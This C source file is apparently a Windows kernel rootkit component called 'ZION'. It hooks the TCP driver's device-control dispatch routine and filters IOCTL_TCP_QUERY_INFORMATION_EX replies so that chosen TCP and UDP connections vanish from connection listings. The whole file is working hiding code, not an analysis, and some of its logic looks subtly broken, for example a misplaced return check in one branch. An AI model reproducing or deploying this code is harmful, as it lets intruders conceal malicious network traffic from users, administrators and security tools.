/*
 *      name: ZION system tdi hook kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_tdi_connection_impl.h"
PFILE_OBJECT g_pFile_tcp = NULL;
PDEVICE_OBJECT g_pDev_tcp = NULL;
OLDIRPMJDEVICECONTROL g_OldIrpMjDeviceControl = NULL;
ZION_HIDE_CONNECTION_INFO HidenConnectionDatabase = {0,{0,0,0,0,0,0,0,0,0,0}};
WCHAR wcsTCPDeviceName[]  = L"\\Device\\Tcp";
BOOL TDI_CONNECTION_HIDE_SERVER(PVOID ptrBufferAddr)
{
	UNICODE_STRING DeviceTCPName;
	PVOID ptrProxyTDIPacketData = ExAllocatePool(
												PagedPool,
												sizeof(ZION_TDI_CONNECTION_CMD_DATA)
												);

	if (NULL == ptrProxyTDIPacketData)
	{
		safe_trace("ZION_SERVER: alloc memory error.\n");
		return 0;
	}
	if (1 != Safe_CopyMemFromUser((PZION_TDI_CONNECTION_CMD_DATA)((PZION_CS_PACKET)ptrBufferAddr)->pData,
						   sizeof(ZION_TDI_CONNECTION_CMD_DATA),
						   ptrProxyTDIPacketData))
	{
		safe_trace("ZION_SERVER: Copy Data error.\n");
		return 0;
	}
	if (NULL == g_pDev_tcp)
	{
		RtlInitUnicodeString (&DeviceTCPName, wcsTCPDeviceName);
		if (!NT_SUCCESS((IoGetDeviceObjectPointer(&DeviceTCPName,
									FILE_READ_DATA,
									&g_pFile_tcp,
									&g_pDev_tcp))))
		{
			safe_trace("ZION_SERVER: Open TCP Device Error.\n");
			return 0;
		}
		g_OldIrpMjDeviceControl = g_pDev_tcp->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
		if (g_OldIrpMjDeviceControl)
		InterlockedExchange ((PLONG)&(g_pDev_tcp->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]), (LONG)Zion_DeviceControl);
	}
	
	AddNonRepeatedData(&HidenConnectionDatabase,(PZION_TDI_CONNECTION_CMD_DATA)ptrProxyTDIPacketData);
	
	ExFreePool(ptrProxyTDIPacketData);
	return 1;
}




NTSTATUS Zion_DeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    PIO_STACK_LOCATION      irpStack;
    ULONG                   ioTransferType;
	TDIObjectID             *inputBuffer;
    irpStack = IoGetCurrentIrpStackLocation (Irp);
safe_trace("ZION_SERVER: aaa.\n");
    switch (irpStack->MajorFunction) 
	{
	    case IRP_MJ_DEVICE_CONTROL:
			if ((irpStack->MinorFunction == 0) && \
				(irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX))//判断Control
			{
				ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
				ioTransferType &= 3;
				if (ioTransferType == METHOD_NEITHER) 
				{
					inputBuffer = (TDIObjectID *) irpStack->Parameters.DeviceIoControl.Type3InputBuffer; 
					if ((inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY) || (inputBuffer->toi_entity.tei_entity == CL_TL_ENTITY))
					{ 
						if ((inputBuffer->toi_id == TCP_CONNECTION_INFO_TYPE_101) || 
							(inputBuffer->toi_id == TCP_CONNECTION_INFO_TYPE_102) || 
							(inputBuffer->toi_id == TCP_CONNECTION_INFO_TYPE_110) ||
							(inputBuffer->toi_id == UDP_CONNECTION_INFO_TYPE_102)//连接类型判断
							)
						{
							irpStack->Control = 0;
							irpStack->Control |= SL_INVOKE_ON_SUCCESS; 
							irpStack->Context = (PCONTEXT_INFO) ExAllocatePool(NonPagedPool, sizeof(CONTEXT_INFO));

							((PCONTEXT_INFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine; 
							((PCONTEXT_INFO)irpStack->Context)->ReqType       = inputBuffer->toi_id;
							((PCONTEXT_INFO)irpStack->Context)->ProtocolType = inputBuffer->toi_entity.tei_entity;//原始信息保存
							irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)Zion_CompletionRoutine;//设置完成例程
						}
					}
				}
			}
		break;
		
		default:
		break;
    }

    return g_OldIrpMjDeviceControl(DeviceObject, Irp);//调用原始派遣例程
}


NTSTATUS Zion_CompletionRoutine(IN PDEVICE_OBJECT DeviceObject, 
								IN PIRP Irp, 
								IN PVOID Context)
{
	PVOID OutputBuffer;
	DWORD NumOutputBuffers;
	PIO_COMPLETION_ROUTINE OrgCompRoutine;
	DWORD i;
	OutputBuffer = Irp->UserBuffer;
	OrgCompRoutine = ((PCONTEXT_INFO)Context)->OldCompletion;
	safe_trace("ZION_SERVER: sss.\n");
	if (((PCONTEXT_INFO)Context)->ProtocolType == CO_TL_ENTITY)
	{
		if (((PCONTEXT_INFO)Context)->ReqType == TCP_CONNECTION_INFO_TYPE_101)
		{
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(TCP_INFO_101);
			for(i = 0; i < NumOutputBuffers; i++)
			{
				if (IfMatchedWithDataBase((PVOID)&(((PTCP_INFO_101)OutputBuffer)[i]),
					&HidenConnectionDatabase,
					TCP_CONNECTION_INFO_TYPE_101,
					CO_TL_ENTITY))
					//if (1)
				{
					memcpy(&(((PTCP_INFO_101)OutputBuffer)[i]), &(((PTCP_INFO_101)OutputBuffer)[i+1]),Irp->IoStatus.Information - (i+1)*sizeof(TCP_INFO_101));
					i--;
					Irp->IoStatus.Information -= sizeof(TCP_INFO_101);
					NumOutputBuffers--;
				}
			}
		}
		else if (((PCONTEXT_INFO)Context)->ReqType == TCP_CONNECTION_INFO_TYPE_102)
		{
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(TCP_INFO_102);
			for(i = 0; i < NumOutputBuffers; i++)
			{
				if (IfMatchedWithDataBase((PVOID)&(((PTCP_INFO_102)OutputBuffer)[i]),
					&HidenConnectionDatabase,
					TCP_CONNECTION_INFO_TYPE_102,
					CO_TL_ENTITY))
					//if (1)
				{
					memcpy(&(((PTCP_INFO_102)OutputBuffer)[i]), &(((PTCP_INFO_102)OutputBuffer)[i+1]),Irp->IoStatus.Information - (i+1)*sizeof(TCP_INFO_102));
					i--;
					Irp->IoStatus.Information -= sizeof(TCP_INFO_102);
					NumOutputBuffers--;
				}
			}
		}
		else if (((PCONTEXT_INFO)Context)->ReqType == TCP_CONNECTION_INFO_TYPE_110)
		{
			NumOutputBuffers = Irp->IoStatus.Information / sizeof(TCP_INFO_110);
			for(i = 0; i < NumOutputBuffers; i++)
			{
				if (IfMatchedWithDataBase((PVOID)&(((PTCP_INFO_110)OutputBuffer)[i]),
					&HidenConnectionDatabase,
					TCP_CONNECTION_INFO_TYPE_110,
					CO_TL_ENTITY))
					//if (1)
				{
					memcpy(&(((PTCP_INFO_110)OutputBuffer)[i]), &(((PTCP_INFO_110)OutputBuffer)[i+1]),Irp->IoStatus.Information - (i+1)*sizeof(TCP_INFO_110));
					i--;
					Irp->IoStatus.Information -= sizeof(TCP_INFO_110);
					NumOutputBuffers--;
				}
			}
		}
	}
	else if (((PCONTEXT_INFO)Context)->ProtocolType == CL_TL_ENTITY)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(UDP_INFO_102);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			if (IfMatchedWithDataBase((PVOID)&(((PUDP_INFO_102)OutputBuffer)[i]),
				&HidenConnectionDatabase,
				UDP_CONNECTION_INFO_TYPE_102,
				CL_TL_ENTITY))
				//if (1)
			{
				memcpy(&(((PUDP_INFO_102)OutputBuffer)[i]), &(((PUDP_INFO_102)OutputBuffer)[i+1]),Irp->IoStatus.Information - (i+1)*sizeof(UDP_INFO_102));
				i--;
				Irp->IoStatus.Information -= sizeof(UDP_INFO_102);
				NumOutputBuffers--;
			}
		}
	}

	ExFreePool(Context);


	if ((Irp->StackCount > (ULONG)1) && (OrgCompRoutine != NULL))
	{
		return (OrgCompRoutine)(DeviceObject, Irp, NULL);
	}
	else
	{
		return Irp->IoStatus.Status;
	}
}
BOOL AddNonRepeatedData(PZION_HIDE_CONNECTION_INFO Database,PZION_TDI_CONNECTION_CMD_DATA src)
{
	unsigned int dwCount;
	if (Database->Total == MAX_HIDEN_CONNECTION)
	{
		return FALSE;
	}
	else
	{
		for (dwCount = 0; dwCount < Database->Total; dwCount ++ )
		{
			if ((src->DstAddr == Database->connection[dwCount].DstAddr) &&
				(src->DstPort == Database->connection[dwCount].DstPort) &&
				(src->SrcAddr == Database->connection[dwCount].SrcAddr) &&
				(src->SrcPort == Database->connection[dwCount].SrcPort) &&
				(src->Type == Database->connection[dwCount].Type))
				return FALSE;
		}
		Database->connection[Database->Total] = *src;
		(Database->Total)++;
		return TRUE;
	}
}
BOOL IfMatchedWithDataBase(PVOID ptrInfo,PZION_HIDE_CONNECTION_INFO ptrDatabase,DWORD type,DWORD ProtocolType )
{
	unsigned int dwCount;
	BOOL dwResult = TRUE;
	if (ProtocolType == CO_TL_ENTITY)
	{
		switch(type)
		{
		case TCP_CONNECTION_INFO_TYPE_101:
			for (dwCount = 0; dwCount < ptrDatabase->Total; dwCount++)
			{
				dwResult =TRUE;
				if (ptrDatabase->connection[dwCount].Type != ZION_TCP_INFO)
				{
					dwResult = FALSE;
				}
				else{
					if ((ptrDatabase->connection[dwCount].DstAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].DstAddr != ((PTCP_INFO_101)ptrInfo)->dwDstAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].DstPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].DstPort != ((PTCP_INFO_101)ptrInfo)->dwDstPort) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].SrcAddr != ((PTCP_INFO_101)ptrInfo)->dwSrcAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].SrcPort != ((PTCP_INFO_101)ptrInfo)->dwSrcPort) )
					{
						dwResult = FALSE;
					}
				}
				if (dwResult) return TRUE;
			}
			break;
		case TCP_CONNECTION_INFO_TYPE_102:
			for (dwCount = 0; dwCount < ptrDatabase->Total; dwCount++)
			{
				dwResult =TRUE;
				if (ptrDatabase->connection[dwCount].Type != ZION_TCP_INFO)
				{
					dwResult = FALSE;
				}
				else{
					if ((ptrDatabase->connection[dwCount].DstAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].DstAddr != ((PTCP_INFO_102)ptrInfo)->dwDstAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].DstPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].DstPort != ((PTCP_INFO_102)ptrInfo)->dwDstPort) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].SrcAddr != ((PTCP_INFO_102)ptrInfo)->dwSrcAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].SrcPort != ((PTCP_INFO_102)ptrInfo)->dwSrcPort) )
					{
						dwResult = FALSE;
					}
				}
				if (dwResult) return TRUE;
			}
			break;
		case TCP_CONNECTION_INFO_TYPE_110:
			for (dwCount = 0; dwCount < ptrDatabase->Total; dwCount++)
			{
				dwResult =TRUE;
				if (ptrDatabase->connection[dwCount].Type != ZION_TCP_INFO)
				{
					dwResult = FALSE;
				}
				else{
					if ((ptrDatabase->connection[dwCount].DstAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].DstAddr != ((PTCP_INFO_110)ptrInfo)->dwDstAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].DstPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].DstPort != ((PTCP_INFO_110)ptrInfo)->dwDstPort) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].SrcAddr != ((PTCP_INFO_110)ptrInfo)->dwSrcAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].SrcPort != ((PTCP_INFO_110)ptrInfo)->dwSrcPort) )
					{
						dwResult = FALSE;
					}
				}

			}
			if (dwResult) return TRUE;
			break;
		}
	}
	else if (ProtocolType == CL_TL_ENTITY)
	{
		switch(type)
		{
		case UDP_CONNECTION_INFO_TYPE_102:
			for (dwCount = 0; dwCount < ptrDatabase->Total; dwCount++)
			{
				dwResult =TRUE;
				if (ptrDatabase->connection[dwCount].Type != ZION_UDP_INFO)
				{
					dwResult = FALSE;
				}
				else{
					if ((ptrDatabase->connection[dwCount].SrcAddr != ZION_ALL_ADDR) &&
						(ptrDatabase->connection[dwCount].SrcAddr != ((PUDP_INFO_102)ptrInfo)->dwSrcAddr) )
					{
						dwResult = FALSE;
					}
					if ((ptrDatabase->connection[dwCount].SrcPort != ZION_ALL_PORT) &&
						(ptrDatabase->connection[dwCount].SrcPort != ((PUDP_INFO_102)ptrInfo)->dwSrcPort) )
					{
						dwResult = FALSE;
					}
				}
				if (dwResult) return TRUE;
			}
			break;
		}
	}
	return FALSE;
}